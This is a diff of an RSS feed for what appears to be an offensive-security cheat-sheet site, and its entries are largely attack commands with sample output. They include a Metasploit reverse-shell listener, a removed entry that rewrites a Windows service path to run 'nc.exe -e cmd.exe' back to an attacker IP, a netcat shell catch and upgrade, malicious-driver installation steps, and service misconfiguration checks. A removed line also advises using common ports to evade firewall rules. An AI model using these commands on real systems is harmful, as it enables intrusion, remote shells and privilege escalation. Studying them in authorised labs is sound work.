@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/metasploit_listener/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_listener/</guid>
-      <description>Start a Metasploit Listener msfconsole -q $ msfconsole -q msf6 &amp;gt; use exploit/multi/handler msf6 &amp;gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp payload =&amp;gt; windows/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lhost 10.10.14.31 lhost =&amp;gt; 10.10.14.31 set lport &amp;lt;LOCAL_PORT&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lport 1337 lport =&amp;gt; 1337 run msf6 exploit(multi/handler) &amp;gt; run [*] Started reverse TCP handler on 10.10.14.31:1337 Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+      <description>Start a Metasploit Listener msfconsole -q $ msfconsole -q msf6 &amp;gt; use exploit/multi/handler msf6 &amp;gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp # Windows x64 set payload windows/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp payload =&amp;gt; windows/x64/meterpreter/reverse_tcp # Linux amd64 set payload linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) &amp;gt; set payload linux/x64/meterpreter/reverse_tcp payload =&amp;gt; linux/x64/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lhost 10.10.14.31 lhost =&amp;gt; 10.10.14.31 set lport &amp;lt;LOCAL_PORT&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lport 1337 lport =&amp;gt; 1337 # Useful for multiple connections set exitonsession false msf6 exploit(multi/handler) &amp;gt; set exitonsession false exitonsession =&amp;gt; false run -j msf6 exploit(multi/handler) &amp;gt; run -j [*] Exploit running as background job 1.</description>
     </item>
     <item>
       <title>Metasploit Shellcode</title>
@@ -64,18 +64,18 @@
       <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
     </item>
     <item>
-      <title>Server Operators</title>
-      <link>https://tldrbins.github.io/server_operators/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/server_operators/</guid>
-      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe config VSS binpath=&amp;#34;C:\windows\tasks\nc.exe -e cmd 10.10.14.44 443&amp;#34; [SC] ChangeServiceConfig SUCCESS 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe stop VSS [SC] ControlService FAILED 1062: The service has not been started. # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.</description>
-    </item>
-    <item>
       <title>Upgrade Shell</title>
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
       <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
+    </item>
+    <item>
+      <title>Windows Services</title>
+      <link>https://tldrbins.github.io/server_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/server_operators/</guid>
+      <description>Check unquoted service path cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; PS C:\Users\user1&amp;gt; cmd.exe /c &amp;#39;wmic service get name,displayname,pathname,startmode |findstr /i &amp;#34;auto&amp;#34; |findstr /i /v &amp;#34;C:\windows\\&amp;#34; |findstr /i /v &amp;#34;&amp;#34;&amp;#34;&amp;#39; WC Assistant WCAssistantService C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe Auto Check service ACLs . .\Get-ServiceAcl &amp;#34;&amp;lt;SERVICE&amp;gt;&amp;#34; | Get-ServiceAcl | Select -ExpandProperty Access PS &amp;gt; &amp;#34;SomeService&amp;#34; | Get-ServiceAcl | select -ExpandProperty Access ...[SNIP]... ServiceRights : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl AccessControlType : AccessAllowed IdentityReference : COMPUTER-MS01\user IsInherited : False InheritanceFlags : None PropagationFlags : None .</description>
     </item>
   </channel>
 </rss>
